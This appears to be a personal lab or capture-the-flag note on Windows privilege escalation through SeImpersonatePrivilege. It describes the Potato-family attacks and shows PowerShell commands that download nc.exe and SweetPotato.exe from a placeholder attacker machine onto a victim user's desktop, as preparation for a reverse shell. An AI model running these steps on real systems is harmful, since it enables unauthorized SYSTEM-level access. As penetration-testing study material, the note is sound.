Look at the privilege this user can be enabled.

#Powershell_terminal 
Run:

```
whoami /priv
```

![[User's privileges-20250909115042113.webp]]

## SeImpersonatePrivilege

`SeImpersonatePrivilege` is a **Windows security privilege** that allows a process to **impersonate another user's access token** after the user has authenticated.

In simple terms:

- If a process has this privilege, it can **act on behalf of another user** on the system.
- This is critical because it can be abused to **escalate privileges** (for example, from a normal user to `SYSTEM`) when combined with token-stealing techniques or Potato-family attacks (Juicy Potato, PrintSpoofer, RoguePotato, etc.).

### Technical details:

- Internal name: `SeImpersonatePrivilege`
- It's granted by default to services and applications that need to act on behalf of other users (for example, IIS, SQL Server, etc.).
- It appears in `whoami /priv` if you have it enabled.

### Typical exploitation flow

1. The attacker gains access with a low-privilege user.
2. They discover they have the `SeImpersonatePrivilege`.
3. They use techniques like [**_PrintSpoofer_**](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) or  [**_SweetPotato_**](https://github.com/CCob/SweetPotato) to execute commands as `NT AUTHORITY\SYSTEM`.

### SweetPotato

You need these tools  *nc.exe*,  *SweetPotato.exe*, so download them  from your ATTACKING MACHIINE.
You can get SweetPotato from https://github.com/crimsonlabs-io/Cache/tree/f4613de4ced9390543c319123b4431ece6e8a2e4/bin.

#Attacking_machine 
- Open a python HTTP server in the folder you have the files.
```
python3 -m http.server 80
```

#Powershell_terminal 
- Run the following code to download the files to the user's desktop.
```
(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKING MACHINE IP>/nc.exe', 'C:\Users\edwardle.WINDCORP\Desktop\nc.exe')

(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKING MACHINE IP>/SweetPotato.exe', 'C:\Users\edwardle.WINDCORP\Desktop\SweetPotato.exe')

```

In the user's desktop you must have:

![[Screenshot from 2025-09-10 11-07-45.png]]

**Next step:** [[Reverse shell]]
